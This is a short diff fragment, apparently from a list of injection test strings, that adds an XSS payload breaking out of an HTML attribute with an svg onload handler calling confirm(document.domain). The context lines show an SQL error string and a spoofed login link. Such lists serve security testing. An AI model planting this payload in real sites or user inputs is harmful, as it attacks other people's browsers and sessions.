@@ -6,6 +6,9 @@
 <font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;</font>
 ```
 ```
+place"><svg+onload=confirm(document.domain)>
+```
+```
 <A HREF="https://www.cia.gov/">Login Here </A>
 ```
 ```
